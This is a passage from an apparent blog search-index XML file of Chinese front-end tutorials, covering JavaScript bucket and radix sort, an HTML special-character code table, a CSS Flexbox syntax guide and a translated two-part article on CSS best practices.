buckets[Math.floor((arr[i] - minValue) / bucketSize)].push(arr[i]); } arr.length = 0; for (i = 0; i &lt; buckets.length; i++) { insertionSort(buckets[i]); //对每个桶进行排序，这里使用了插入排序 for (var j = 0; j &lt; buckets[i].length; j++) { arr.push(buckets[i][j]); } } return arr; } 基数排序（Radix Sort）基数排序须知：基数排序有两种方法：1.MSD 从高位开始进行排序2.LSD 从低位开始进行排序 基数排序 vs 计数排序 vs 桶排序这三种排序算法都利用了桶的概念，但对桶的使用方法上有明显差异：基数排序：根据键值的每位数字来分配桶计数排序：每个桶只存储单一键值桶排序：每个桶存储一定范围的数值 LSD基数排序动图演示：Radix Sort 动图演示 算法可视化来源：http://visualgo.net/ 基数排序JavaScript代码实现：//LSD Radix Sort var counter = []; function radixSort(arr, maxDigit) { var mod = 10; var dev = 1; for (var i = 0; i &lt; maxDigit; i++, dev *= 10, mod *= 10) { for(var j = 0; j &lt; arr.length; j++) { var bucket = parseInt((arr[j] % mod) / dev); if(counter[bucket]==null) { counter[bucket] = []; } counter[bucket].push(arr[j]); } var pos = 0; for(var j = 0; j &lt; counter.length; j++) { var value = null; if(counter[j]!=null) { while ((value = counter[j].shift()) != null) { arr[pos++] = value; } } } } return arr; } 写在最后排序算法实在是博大精深，还有hin多hin多我没有总结到或者我自己还没弄明白的算法，仅仅是总结这十种排序算法都把我写哭了。。。因此，以后如果我掌握了更多的排序姿势，我一定还会回来的！ 转自：http://www.jianshu.com/p/1b4068ccd505]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[【html】html特殊字符大全🍀]]></title>
      <url>%2F2016%2F03%2F18%2F13%2F</url>
      <content type="text"><![CDATA[来自: sugar使用方法：这些字符属于unicode字符集，所以，你的文档需要声明为UTF-8；下面符号列表的后面有两列编号，它们并不太一样，第一列是用于html的，你需要在前面加上&amp;#符号；第二列可以用于CSS文件中，但是需要用反斜杠\转义；第二列也可以用于javascript，和CSS用法一样，不过要用\u来转义。需要主意的是： 有的字符在不同的浏览器下表现不太一样；比如小雪人 ☃ 在firefox和Chrome下不太一样，钻石 ◆ 在IE下要比Chrome下要大一点儿；有的字符在某个浏览器下不会显示；当然原因并不是字符代码的问题，而是浏览器的bug，比如，–在Chrome下。。。但是，98%的字符都能在所有浏览器下正常显示的，不过如果你真的要使用，最好仔细在各个浏览器下验证一番。经测试这些字符在Android/iOS等智能终端的识别度比较差，所以，使用的时候要特别注意移动浏览器～～ 各种箭头⇠ 8672 21E0⇢ 8674 21E2⇡ 8673 21E1⇣ 8675 21E3↞ 8606 219E↠ 8608 21A0↟ 8607 219F↡ 8609 21A1← 8592 2190→ 8594 2192↑ 8593 2191↓ 8595 2193↔ 8596 2194↕ 8597 2195⇄ 8644 21C4⇅ 8645 21C5↢ 8610 21A2↣ 8611 21A3⇞ 8670 21DE⇟ 8671 21DF↫ 8619 21AB↬ 8620 21AC⇜ 8668 21DC⇝ 8669 21DD↚ 8602 219A↛ 8603 219B↮ 8622 21AE↭ 8621 21AD 形状⇦ 8678 21E6⇨ 8680 21E8⇧ 8679 21E7⇩ 8681 21E9↷ 8631 21B7↶ 8630 21B6↻ 8635 21BB↺ 8634 21BA⟳ 10227 27F3⟲ 10226 27F2⟰ 10224 27F0⟱ 10225 27F1↵ 8629 21B5↯ 8623 21AF⇵ 8693 21F5 向右的箭头➔ 10132 2794➙ 10137 2799➨ 10152 27A8➲ 10162 27B2➜ 10140 279C➞ 10142 279E➟ 10143 279F➠ 10144 27A0➤ 10148 27A4➥ 10149 27A5➦ 10150 27A6➧ 10151 27A7➵ 10165 27B5➸ 10168 27B8➼ 10172 27BC➽ 10173 27BD➺ 10170 27BA➳ 10163 27B3➾ 10174 27BE 基本形状▲ 9650 25B2► 9658 25BA▼ 9660 25BC◄ 9668 25C4❤ 10084 2764✈ 9992 2708★ 9733 2605✦ 10022 2726☀ 9728 2600◆ 9670 25C6◈ 9672 25C8▣ 9635 25A3 标点« 171 00AB» 187 00BB‹ 139 008B› 155 009B“ 8220 201C” 8221 201D‘ 8216 2018’ 8217 2019• 8226 2022◦ 9702 25E6¡ 161 00A1¿ 191 00BF℅ 8453 2105№ 8470 2116&amp; 38 0026@ 64 0040℞ 8478 211E℃ 8451 2103℉ 8457 2109° 176 00B0| 124 007C¦ 166 00A6– 8211 2013— 8212 2014… 8230 2026¶ 182 00B6∼ 8764 223C≠ 8800 2260 法律符号® 174 00AE© 169 00A9℗ 8471 2117™ 153 0099℠ 8480 2120 货币$ 36 0024¢ 162 00A2£ 163 00A3¤ 164 00A4€ 8364 20AC¥ 165 00A5₱ 8369 20B1₹ 8377 20B9 数学½ 189 00BD¼ 188 00BC¾ 190 00BE⅓ 8531 2153⅔ 8532 2154⅛ 8539 215B⅜ 8540 215C⅝ 8541 215D‰ 8240 2030% 37 0025&lt; 60 003C 62 003E 音乐符号♩ 9833 2669♪ 9834 266A♫ 9835 266B♬ 9836 266C♭ 9837 266D♯ 9839 266F 对号、错号160 00A0☐ 9744 2610☑ 9745 2611☒ 9746 2612✓ 10003 2713✔ 10004 2714✕ 10005 10005✖ 10006 2716✗ 10007 2717✘ 10008 2718 十字☨ 9768 2628☩ 9769 2629✝ 10013 271D✞ 10014 271E✟ 10015 271F✠ 10016 2720✚ 10010 271A† 8224 2020✢ 10018 2722✤ 10020 2724✣ 10019 2723✥ 10021 2725 星星、星号、雪花★ 9733 2605✭ 10029 272D✮ 10030 272E☆ 9734 2606✪ 10026 272A✡ 10017 2721✯ 10031 272F✵ 10037 2735✶ 10038 2736✸ 10040 2738✹ 10041 2739✺ 10042 273A✱ 10033 2731✲ 10034 2732✴ 10036 2734✳ 10035 2733✻ 10043 273B✽ 10045 273D❋ 10059 274B❆ 10054 2746❄ 10052 2744❅ 10053 2745 杂项☻ 9787 263B☺ 9786 263A☹ 9785 2639✉ 9993 2709☎ 9742 260E☏ 9743 260F✆ 9990 2706� 65533 FFFD☁ 9729 2601☂ 9730 2602❄ 10052 2744☃ 9731 2603❈ 10056 2748✿ 10047 273F❀ 10048 2740❁ 10049 2741☘ 9752 2618❦ 10086 2766☕ 9749 9749❂ 10050 2742☥ 9765 2625☮ 9774 262E☯ 9775 262F☪ 9770 262A☤ 9764 2624✄ 9988 2704✂ 9986 2702☸ 9784 2638⚓ 9875 2693☣ 9763 2623⚠ 9888 26A0⚡ 9889 26A1☢ 9762 2622♻ 9851 267B♿ 9855 267F☠ 9760 2620 手型、铅笔、笔☜ 9756 261C☞ 9758 261E☝ 9757 261D☟ 9759 261F✌ 9996 270C✍ 9997 270D✎ 9998 270E✐ 10000 2710✏ 9999 270F✑ 10001 2711✒ 10002 2712 天空、植物☽ 9789 263D☾ 9790 263E♂ 9794 2642♀ 9792 2640☿ 9791 263F♁ 9793 2641♃ 9795 2643♄ 9796 2644♅ 9797 2645♆ 9798 2646♇ 9799 2647 星座♈ 9800 2648♉ 9801 2649♊ 9802 264A♋ 9803 264B♌ 9804 264C♍ 9805 264D♎ 9806 264E♏ 9807 264F♑ 9809 2651♒ 9810 2652♓ 9811 2653 象棋，扑克牌♚ 9818 265A♛ 9819 265B♜ 9820 265C♝ 9821 265D♞ 9822 265E♟ 9823 265F♔ 9812 2654♕ 9813 2655♖ 9814 2656♗ 9815 2657♘ 9816 2658♙ 9817 2659♠ 9824 2660♣ 9827 2663♥ 9829 2665♦ 9830 2666♤ 9828 2664♧ 9831 2667♡ 9825 2661♢ 9826 2662 希腊字母Α 913 0391Β 914 0392Γ 915 0393Δ 916 0394Ε 917 0395Ζ 918 0396Η 919 0397Θ 920 0398Ι 921 0399Κ 922 039AΛ 923 039BΜ 924 039CΝ 925 039DΞ 926 039EΟ 927 039FΠ 928 03A0Ρ 929 03A1Σ 931 03A3Τ 932 03A4Υ 933 03A5Φ 934 03A6Χ 935 03A7Ψ 936 03A8Ω 937 03A9 转自：https://www.douban.com/group/topic/28046629/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[布局教程：语法篇🎁]]></title>
      <url>%2F2016%2F03%2F15%2F12%2F</url>
      <content type="text"><![CDATA[Flex 布局教程：语法篇作者： 阮一峰日期： 2015年7月10日网页布局（layout）是CSS的一个重点应用。布局的传统解决方案，基于盒状模型，依赖 display属性 + position属性 + float属性。它对于那些特殊布局非常不方便，比如，垂直居中就不容易实现。2009年，W3C提出了一种新的方案—-Flex布局，可以简便、完整、响应式地实现各种页面布局。目前，它已经得到了所有浏览器的支持，这意味着，现在就能很安全地使用这项功能。Flex布局将成为未来布局的首选方案。本文介绍它的语法，下一篇文章给出常见布局的Flex写法。以下内容主要参考了下面两篇文章：A Complete Guide to Flexbox和 A Visual Guide to CSS3 Flexbox Properties。 一、Flex布局是什么？Flex是Flexible Box的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。任何一个容器都可以指定为Flex布局。 .box{ display: flex; } 行内元素也可以使用Flex布局。 .box{ display: inline-flex; } Webkit内核的浏览器，必须加上-webkit前缀。 .box{ display: -webkit-flex; /* Safari */ display: flex; } 注意，设为Flex布局以后，子元素的float、clear和vertical-align属性将失效。 二、基本概念采用Flex布局的元素，称为Flex容器（flex container），简称”容器”。它的所有子元素自动成为容器成员，称为Flex项目（flex item），简称”项目”。容器默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）。主轴的开始位置（与边框的交叉点）叫做main start，结束位置叫做main end；交叉轴的开始位置叫做cross start，结束位置叫做cross end。 三、容器的属性以下6个属性设置在容器上。 · flex-direction · flex-wrap · flex-flow · justify-content · align-items · align-content 3.1 flex-direction属性flex-direction属性决定主轴的方向（即项目的排列方向）。 .box { flex-direction: row | row-reverse | column | column-reverse; } 它可能有4个值。 · row（默认值）：主轴为水平方向，起点在左端。 · row-reverse：主轴为水平方向，起点在右端。 · column：主轴为垂直方向，起点在上沿。 · column-reverse：主轴为垂直方向，起点在下沿。 3.2 flex-wrap属性默认情况下，项目都排在一条线（又称”轴线”）上。flex-wrap属性定义，如果一条轴线排不下，如何换行。 .box{ flex-wrap: nowrap | wrap | wrap-reverse; } 它可能取三个值。（1）nowrap（默认）：不换行。（2）wrap：换行，第一行在上方。（3）wrap-reverse：换行，第一行在下方。 3.3 flex-flowflex-flow属性是flex-direction属性和flex-wrap属性的简写形式，默认值为row nowrap。 .box { flex-flow: &lt;flex-direction&gt; || &lt;flex-wrap&gt;; } 3.4 justify-content属性justify-content属性定义了项目在主轴上的对齐方式。 .box { justify-content: flex-start | flex-end | center | space-between | space-around; } 它可能取5个值，具体对齐方式与轴的方向有关。下面假设主轴为从左到右。 · flex-start（默认值）：左对齐 · flex-end：右对齐 · center： 居中 · space-between：两端对齐，项目之间的间隔都相等。 · space-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。 3.5 align-items属性align-items属性定义项目在交叉轴上如何对齐。 .box { align-items: flex-start | flex-end | center | baseline | stretch; } 它可能取5个值。具体的对齐方式与交叉轴的方向有关，下面假设交叉轴从上到下。 · flex-start：交叉轴的起点对齐。 · flex-end：交叉轴的终点对齐。 · center：交叉轴的中点对齐。 · baseline: 项目的第一行文字的基线对齐。 · stretch（默认值）：如果项目未设置高度或设为auto，将占满整个容器的高度。 3.6 align-content属性align-content属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。 .box { align-content: flex-start | flex-end | center | space-between | space-around | stretch; } 该属性可能取6个值。 · flex-start：与交叉轴的起点对齐。 · flex-end：与交叉轴的终点对齐。 · center：与交叉轴的中点对齐。 · space-between：与交叉轴两端对齐，轴线之间的间隔平均分布。 · space-around：每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍。 · stretch（默认值）：轴线占满整个交叉轴。 四、项目的属性以下6个属性设置在项目上。 · order · flex-grow · flex-shrink · flex-basis · flex · align-self 4.1 order属性order属性定义项目的排列顺序。数值越小，排列越靠前，默认为0。 .item { order: &lt;integer&gt;; } 4.2 flex-grow属性flex-grow属性定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大。 .item { flex-grow: &lt;number&gt;; /* default 0 */ } 如果所有项目的flex-grow属性都为1，则它们将等分剩余空间（如果有的话）。如果一个项目的flex-grow属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍。 4.3 flex-shrink属性flex-shrink属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小。 .item { flex-shrink: &lt;number&gt;; /* default 1 */ } 如果所有项目的flex-shrink属性都为1，当空间不足时，都将等比例缩小。如果一个项目的flex-shrink属性为0，其他项目都为1，则空间不足时，前者不缩小。负值对该属性无效。 4.4 flex-basis属性flex-basis属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。 .item { flex-basis: &lt;length&gt; | auto; /* default auto */ } 它可以设为跟width或`height属性一样的值（比如350px），则项目将占据固定空间。 4.5 flex属性flex属性是flex-grow,flex-shrink 和 flex-basis的简写，默认值为0 1 auto。后两个属性可选。 .item { flex: none | [ &lt;&apos;flex-grow&apos;&gt; &lt;&apos;flex-shrink&apos;&gt;? || &lt;&apos;flex-basis&apos;&gt; ] } 该属性有两个快捷值：auto (1 1 auto) 和 none (0 0 auto)。建议优先使用这个属性，而不是单独写三个分离的属性，因为浏览器会推算相关值。 4.6 align-self属性align-self属性允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性。默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch。 .item { align-self: auto | flex-start | flex-end | center | baseline | stretch; } 该属性可能取6个值，除了auto，其他都与align-items属性完全一致。（完）转自：http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CSS最佳实践——成为CSS忍者的十四步下😎]]></title>
      <url>%2F2016%2F03%2F12%2F11%2F</url>
      <content type="text"><![CDATA[前言继续上一篇的内容，本篇由@安生翻译分享。正文从这开始~下边的CSS最佳实践会帮助你掌握CSS，让你从专业人员过渡到CSS忍者。第二部分你会先学习到如何设置你的排版，然后掌握CSS类的命名约定。你还会学到模块化和DRY原则，最后你会找到如何解决CSS前缀问题的方法。 第七条：一次性搞定排版这一条实践是关于排版的。经常阅读我博客的人可能知道我是个排版狂热爱好者。我相信排版是Web设计中最难的部分之一。学好它已经很难了，更别说掌握。数字化排版包含了很多细节，根据我的经验之谈，如果不清楚这些细节的话就没有办法设计得很好。不管怎么说，掌握排版不是我们现在要探讨的问题。我写了篇文章《crafting perfect web typography》，如果你想深入了解网页排版的话可以阅读看看。对于CSS最佳实践，我们则是要坚持一条简单的规则，你应该一次性搞定好排版。不应该去覆盖你设过的默认排版风格。如果有特殊状况需要修改的话，修改一两次是可以接受的。 有例外吗？那么什么时候可以不遵循这一条实践呢？我的回答是当你没有其他选择的时候。意思就是，假定你在设计一个博客，受Material design风格的影响可能会采用卡片布局，你可以通过这篇文章《complete guide to Material design》学习如何操作。由于每张卡片都是独立的模块，我们可以使用article元素来包装每张卡片的内容，内容包括标题、缩略图和文本。每张卡片，或者说每篇文章，是页面中的一个包含独立内容的组件。理论上它们的内容之间是没有依赖关系的。换句话说，每张卡片都是不同的博文。因此我们可以给卡片的标题设置一个h1标签，通常情况下你应该只在一个页面中出现一个h1，但这只适合于充斥着div元素的旧HTML结构。div是没有语义的，所以当你在一个div中放入一个h1，它没有任何意义。除此之外，它还会有些不同。简单地说，浏览器会将这个标题h1解释为article的一部分，而不是页面中的其他地方。所以如果你在这个页面中有五个article，理论上你可以有五个h1。因此我们就能给每张博文卡片的标题各设置一个h1了。这么并不会违背HTML5和其语义。但不好的一面是它可能会造成一个问题。 有时候标题过大我们经常在内容里划出一大块区域来定义标题。以一篇博文为例。即使是非常大的标题也是有足够的空间可以容纳的，假设你想让标题h1设为5.063rem（在font-size:16px的情况下），那么就是说标题的字体大小为80px，这对一篇博文来说是没有问题的，但如果它是在一张博文卡片里面呢？这个标题大小会变得不成比例地大。那么有三种方案你可以采用。第一，改变全局的h1设置，代价是这个站点的每个页面都会受到影响。所有的标题都将小得多，这不是我们想要的。那么来看下其他的方案。第二，改变标题标签。 没有人规定说博文卡片必须使用h1作为标题吧。当然从语义化的角度讲最好从h1的标题开始。但是使用h2、h3、h4甚至h5也是可以的。这种方案的好处在于不用重新定义全局排版设置了。因此也不会影响到站点里的其他页面。 语义化，CSS最佳实践和例外但当你又想语义化又想遵循CSS最佳实践时，你可以选择第三种方案。我们可以使用一条CSS样式覆盖博文卡片中标题所占据的空间。我会建议用一个特定的class来完成这件事。否则用元素选择器覆盖标题的话，如果有使用CSSLint则会出现警告。这个方案的坏处是我们会破坏掉另一条最佳实践。和一两条实践起冲突也不是什么大事，而且当利大于弊时，破坏一两条实践也是件好事。首先你不用改变全局设置了，也就不用担心破坏其他页面的布局。其次你能使你的HTML保持语义化。所以当你用在线工具测试你的HTML代码时，测试会是通过的。 遵循CSS最佳实践排版设置把所有需要排版的元素给它们定义一个默认样式。你可以把这些样式赋在标题、段落、粗体、链接、列表等等。然后在理想状况下你就不需要再覆盖这些样式了，实现设计的一致性。 第八条：使用描述性的类名这条最佳实践是要让你的CSS变得更清晰。清晰的意思就是有着更容易理解的类名。经常有些只有作者才能理解的CSS类名的例子。我做过很多项目，在极端情况下，没有前边开发者或者文档的帮助我是看不懂CSS的。这显然不是一个合理的方式。 起些是人都可以明白的类名当你起一个CSS类名时你应该考虑下别人容不容易理解。一个好的class应该是看过去就能猜出大概来。而且明白什么时候应该使用和如何去使用。但也不是说你应该把每个小细节都描述出来。而是应该在不依赖文档和询问别人的情况下，这个CSS类名才算起得具有描述性。比方你有一个样式化按钮的class，它应该带有像btn或者button的字符。许多框架都会用像btn-primary、btn-secondary、btn-danger、btn-success的类名。你就不需要知道关于框架或者开发者的额外信息了。而且你还能清楚使用这些按钮的场景。这同样适用于网站里的其他组件。你可以使用.heading-big、.heading-small、.nav、.nav-primary、.nav-social、.link-active、.link-inactive。这些例子都有一个共同点，都能表明应该在什么场景下使用。我想你对.btn-primary、nav-main、text-uppercase不会使用不当。所有这些类名都很直观。即使你不懂英语只有一本字典，也可以理解得到大多数这些类名。 不止是CSS最佳实践如果你的类名外人不容易理解，你应该做出改变了。你需要把这条列入你的CSS最佳实践。不止是CSS，你写的任何代码都应该加上这条建议。如果你在JS，那么其他开发者应该不需要文档或者问你就能理解。测试的方法就是把你的代码给其他人看看，听听他们会怎么说。 不要走极端最后一点我想要说明的是不要走极端。对于描述性类名来说，在简洁和过细之间有一条边界。但要平衡好是不容易的事。一些类名像.btn-danger或者.link-inactive，只用了两个单词来描述；其他的类名可能需要三个或更多的单词，像.progress-meter-text、.stacked-for-medium、.footer-button-to-top。找到边界的唯一途径就是实验。最好就是尝试不同的类名然后问下别人的建议。花点时间练习你就能拥有起个漂亮类名的技能。 第九条：遵循一个命名约定让我们再说点关于CSS类名的。CSS最佳实践的一个目标是让你的CSS变得可维护。可以通过命名约定来做到这点。上边我提过的类名都是用破折号来断字的，而没有出现过下划线的例子。而且所有例子都是小写，也都是元素后边跟着修饰词的结构(.btn-primary、.nav-main)。所以这些让CSS变得可维护起来。这些特性让CSS可预测和可跟进。这样当别人加入你的团队就也能很快上手了。而且当坚持一种风格时，你也不用去时时查看别人的工作，不论她的技能如何或者对项目的熟悉程序。如果她遵循同一条命名规范，你们的CSS就会看起来没有区别。即使你是独自工作的，遵循一种命名约定也是有用处的。你不用再想说应该用什么结构，用破折号还是下划线，用大写小写还是驼峰写法。只要你遵循一个命名约定并运用在你每个项目中，你就能空出一些时间来设计或者写代码来。 第十条：使用BEM使用BEM标记法可能看起来和CSS最佳实践没什么关系。但它还是和命名约定相关的。所以我简单地提及一下。BEM可以用来对CSS类名进行命名约定。BEM是block、element、modifier的缩写。它也使用了破折号和下划线。BEM旨在帮助开发者理解HTML和CSS之间的关系。它是通过三个构建块和两个符号实现的。在BEM里，block是组件里的最高级别。可以是.nav、sidebar、btn（navigation、sidebar、button）。你可以认为这些块是父元素，之后就是子元素element了。这些元素采用父块名字加上两个下划线再加上子元素的名字。比如.sidebar__list、.nav__link、.btn__icon。接着我们来解释下modifier。它在不改变组件本身的情况下改变block或者element的属性。换句话说，它允许你在不触及默认样式的情况下样式化组件。你需要做的就是在block和element后添加两个连字符。比如.btn--primary、.list--inline、.icon--small、.heading--big。这可能比较难理解。你可以通过我这篇文章来了解crash course on BEM》。你可以掌握一切关于BEM的东西，或许之后你就会把这条CSS最佳实践列在执行之列。 第十一条：让你的代码保持DRY我想编程的人都听说过DRY这个缩略词。它是一条经验丰富的程序员给初学者的建议，因此它被列入CSS最佳实践里。DRY这个词是”Dont’t Repeat Yourself”（不要重复粘贴你的代码）的缩写。这很容易做到，这条实践的一点是还需要定期重构你的代码。也就是说通过浏览一遍你的代码然后找到你重复过的东西。当你发现一些重复的代码，你应该把它变成可复用性的东西。在CSS中，你可以创建一个新的class然后把这些样式一并放入。然后你就不必经常重复写这些样式而是通过class来调取。当然这一条实践也有受限之处，你不用给那些只重复两三次的样式设置新class，不然都被类填满了，请看下一条吧。 第十二条：模块化这是让你的CSS变得DRY又理性的方式。你应该把页面上的大部分元素看成一个模块或者组件。实际上这也是很多框架像Bootstrao和Foundation所遵循的。按钮、卡片、列表、模态、表格、提示信息，都是模块或者组件的例子。它们都有着一个关键特征，都是可复用的。列表、按钮或者模态的样式都不是局限在一个页面之中，你可以在任何地方使用它们。这意味着你不用一次又一次地写相同的CSS代码。只要你使用正确的class你的工作便完成了。有许多方法可以模块化CSS。像SMACSS、OOCSS、ITCSS、Atomic design。大多数都很容易学习上手，有一些可能就难点。不同的方法可能适应不同的需求，所以没有说哪一种是最好的。但我可以告诉你我最近使用哪一款。我用的是Atomic Design，我的博客读者可能知道这一点。我不久前写过这篇文章《crash course on Atomic Design》，如果你要使用这一款的话，这篇文章可以帮助你上手。无论使用哪种方法，你的目标都是减少你的CSS代码，从这个意义上说，模块化和DRY实践是一样的。 第十三条：经常检查你的前缀你多久使用一次前缀？如果你经常尝试前沿的CSS技术，答案可能就是经常使用。那么你多久会检查一下这些前缀呢？前缀只是使用CSS最新特性的暂时性解决方案。一旦浏览器实现了一些特性，它们就会忽略掉关于这个特性的前缀。结果就是这前缀没有作用了。而且所有这些过时的前缀可能会影响到性能表现。这不是说你应该停止使用前缀或者不使用前沿特性。这么做只会延缓这些特性的被采用。因为它们更少地被使用。因此为了促进这些特性的被录用我们应该使用它们。但这不能解决过时前缀带来的臃肿CSS，我们要做些什么呢？你应该定期检查你的CSS然后移除那些没有用的前缀。但对于大项目来说可能就会变得很浪费时间。那么你就可能借助一些工具像autoprefixer或者prefix-free。这些工具不仅能给试验性CSS特性加上前缀，而且可以移除掉过时的前缀。自动化整个过程让CSS最佳实践执行起来更容易。 第十四条：验证你的CSS最后一条非常简单，经常去校验你的CSS。CSS validator可以帮你不出错。而且CSS validator遵循W3C的规范。所以在你提交代码给客户或者老板之前先测试下。你的代码输出应该是有效且没有错误的。 附一：你需要预处理器吗Sass，Less，PostCSS，你至少听过一种吧。CSS预处理器存在有一阵子了。许多开发者都在使用，我现在用着Sass。但我对PostCSS也很感兴趣。言归正传，我想说的是，你并不需要预处理器。人们经常热衷于问说什么预处理器对Web设计来说是最好的。使用Sass，Stylus还是Less或者PostCSS？在回答之前，我们需要认清一件事，你对CSS的了解有多少，许多人想通过掌握预处理器而去取代掌握好CSS。你会想在学会开车之前先去开赛车吗?假设你知道怎么使用踏板、方向盘和启动引擎，你会直接上跑道去开赛车吗？你可能开不到太远或者直接挂掉。那么对CSS来说也是如此，不要误会我的意思，我喜欢预处理器，它很强大，能改善你的工作流程和提高工作效率。 能力越大，责任越大能力伴随着责任。当你不大清楚CSS的基础时，你的代码可能写得不大好。当你添加了预处理器那么代码的糟糕性会有指数倍上升的危险。最简单普遍的例子来解释预处理器的强大就是嵌套。在纯CSS里，你不能嵌套选择器，你只能连续使用多个选择器来实现。但如果你用预处理器的话就很容易实现。我看过有人嵌套超过五层，结果可能就像是html .wrapper header .nav li a {...}，问题就是当你用预处理器的时候你是意识不到这一点的。所以经常会很极端地去嵌套。这就是一个预处理器为何会失去控制的一个例子。所以我想在使用预处理器之前，你应该先好好地掌握CSS。 你真的需要一个预处理器吗？让我们回到开头的问题，你真的需要使用预处理器吗？我的回答是不需要。如果你不想的话完全可以不用。这是自愿的选择，和你的技能水平没有任何关系。如果你没有使用也不用觉得尴尬。我身边很多很棒的Web开发者都用的纯CSS。无论你用了多少预处理器，你都达不到他们的水平。我想这个问题可以引申到其他工具。你是不是会经常问别人用什么工具去做一件什么事最好？这些问题的初衷是什么？是我们想要找到一样可以把我们的技能提升10倍的工具吗？如果是这样的话那么妄想。能力不取决于工具，如果你会画画，无论你是用钢笔，铅笔，刷子还是棍子都一样。这些工具不会提升或者削弱你的技能。你可能需要时间来适应你的新工具。假设你从使用PS到换成sketch，那么你开头可能运用地不是很好，但是这并不会让你的技能变糟糕。你只是还没适应这个新工具。当你知道怎么操作，你的技能依旧摆在那里。明白了你的能力和工具是没有关系的话，你就不用纠结于是否一定要去使用预处理器了。如果你的CSS不好，预处理器并不能拯救你，如果你是CSS大神，不使用预处理器也不会让你变得不强大，所以你没有必要使用预处理器。 附二：你应该lint吗？这也是一个一直受到热议的问题。在这篇文章里我们将只讨论CSS和JS。赞成的人说它会让你的代码更简洁和更少漏洞。反对的人则说它的规则太严格约束了。是的当你想要使用某种工具时你必须受限于它的规则。但是这些规则有多严格取决于两个因素。 你要记住的两个因素第一个是你要运用的是哪种工具。假设是JS，现在有JSLint，JSHint,ESLint。JSLint是最老牌和最严格的，它的好处是它已配置好，你可以立刻上手。坏处是你不能改变它的配置。所以如果你不喜欢某条规则的话，你只能适应它或者换别的工具。JSHint和ESLint允许你自定义。因此你可以讨厌某条规则，你只需要创建个性化的配置来使用。对于CSSLint来说也是如此，你可以随意改变规则，遵循定制化的CSS最佳实践。第二个因素决定规则有多严格的是你自己。只有你可以决定你要跟进多严格的规则。当然有些工具不允许你自行配置，那么你可以不使用它们，它们可以互相取代的。如果不行你可以自己造轮子嘛。 我们回答错问题了吗？我想我们回答错问题了。我们不应该讨论使用代码检测是好还是坏。它只是一条CSS最佳实践。我们应该问的是我们是否理解了这些规则。检测你的代码和改正错误或者警告是一件事，另一件事是要明白为什么这些改变是有用的。当你决定去改变一些东西的时，你应该知道你为什么要这样做，这很重要。这就是为什么我不能站在任何一边的原因。我不认为他们指向了问题的正确所在。他们试图找到方法来编写简洁的代码，但问题并不在于混乱或是错误的代码，而是知识。想想为什么你经常犯错，这发生在你对它认识不深的状况下。诚然它可以让代码变得简洁和零失误，但不会告诉你为什么。这就是我们需要关注的问题所在。我经常鼓励开发者使用lint，但是这是在他们经常会去弄清为什么那些代码会抛出错误的情况下。不然的话就没有意义了。我的意思就是说这样你学不到任何东西，你可能记住了这些规则，但和完全理解它是不同的。 所以，你需要lint吗？你应该有能力去判断你是否应该改变你的代码。所以我对这个问题的回答是肯定的。用它来校验你的代码可能可以保持一个很好的状态。但你需要知道你为什么要遵循这些规则。对于这些CSS最佳实践来说都是如此，首先你要明白为什么，清楚它们的背景，然后你就可以自行决定了。在你可以理解的范围内它就是好的。 不要想CSS最佳实践了我希望这十四条实践对你有所帮助。CSS有很多可说的，我选择了可以帮你解决重大困惑和让你的CSS看起来更佳的实践。最后我要说的是，你自己决定要选择哪些CSS最佳实践吧，CSS可以是美妙的。最后@安生曾经分享过的文章：【第526期】提高你的Javascript水平【第730期】提升你的CSS 关于本文译者：@安生原文：http://blog.alexdevero.com/css-best-practices-become-css-ninja-pt2/转自：前端早读课]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CSS最佳实践——成为CSS忍者的十四步上😎]]></title>
      <url>%2F2016%2F03%2F10%2F10%2F</url>
      <content type="text"><![CDATA[前言本文来自@安生的翻译分享。本文有两篇，本文是上，下篇在第二条。正文从这开始~就算是专业的Web开发者，可能也很难管理好CSS。在这个系列里，你将了解十四条关于CSS的最佳实践。在第一部分，你将学习如何掌握CSS特殊的层次结构，你会发现!important声明和ID选择器的危险，也会学习到过高优先级选择器带来的代价，最后你还会学习如何规避浏览器带来的不一致性。让我们开始学习吧。 第一条：掌握CSS特殊的层次结构让我们从最艰难的一步开始。如果你想要成为一个CSS忍者，那么这是你必须掌握的，即便你不想成为忍者，也至少应该了解它。如果你只是想在同事朋友面前吹嘘一下，那么这块知识你一定要懂。有大量的人自称他们是Web开发者或者Web设计人员。 经常被忽略的基础知识有趣的是，很多人对这个话题一无所知。这些人搭建了网站或者Web应用却不知道CSS是怎么工作的。他们知道一些层叠的知识，或者浏览器如何阅读选择器的（从右到左）。想象一下你认识一个对汽车的认知还不错的人，但你会让这个人给你造一辆车吗？恐怕不会。不过如果你需要让人给你搭一个网站，你就需要寻找一个专业人士了。如果你同意我的话，那么真正专业的人士是会想去掌握好他的手艺的人。这种人会着迷于任何一个细节。如果CSS层次就是其中一个细节呢？或者是一个CSS最佳实践呢？那么，忽略这个细节的人就不能称之为专业人士了。如果你想变得专业，你必须学习它，而如果你想成为忍者，你必须掌握它。你需要了解CSS的任何一个特性。当一个小孩问你，你需要能解释得出来，虽然不太可能发生。当然，你潜在的客户或者老板可能会问你关于这方面的东西。这个话题就是一个测试知识点的很好方式。正如讨论过的，很多开发者对CSS特殊的层次结构知之甚少。因此这个问题可以说是帮助雇主们用来找到人才的好方法。若在网上向自由职业者提出这个问题，有多少人能够回答呢? CSS特殊层次结构的困难之处那么既然它如此重要，为什么它是CSS最容易被忽略的部分之一呢，而且为什么极少的CSS实践中会提及到？大概是因为你可能需要做一些数学运算。在这个层次结构中，每个CSS选择器都有一些特定的值。而且当你组合起选择器时，这些值会增加。因此简单的元素选择器（如a）比两个元素的选择器（如a 